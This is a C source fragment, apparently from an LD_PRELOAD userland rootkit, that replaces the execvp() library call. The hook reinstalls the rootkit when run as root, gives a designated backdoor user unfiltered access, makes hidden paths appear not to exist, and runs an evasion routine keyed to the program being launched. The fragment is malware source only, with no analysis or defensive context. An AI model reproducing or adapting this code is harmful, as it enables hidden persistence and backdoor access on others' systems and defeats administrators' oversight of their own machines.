int execvp(const char *filename, char *const argv[]){
	if(!not_user(0))
		reinstall();
	hook(CEXECVP);
	if(is_bdusr())
		return call(CEXECVP, filename, argv);
	if(hidden_path(filename)){
		errno = ENOENT;
		return -1;
	}
	int evasion_status = evade(filename, argv, NULL);
	switch(evasion_status){
		case VEVADE_DONE:
			exit(0);
		case VINVALID_PERM:
			errno = EPERM;
			return -1;
		case VFORK_ERR:
			return -1;
		case VFORK_SUC:
			return call(CEXECVP, filename, argv);
		case VNOTHING_DONE:
			break;
	}
	return call(CEXECVP, filename, argv);
}
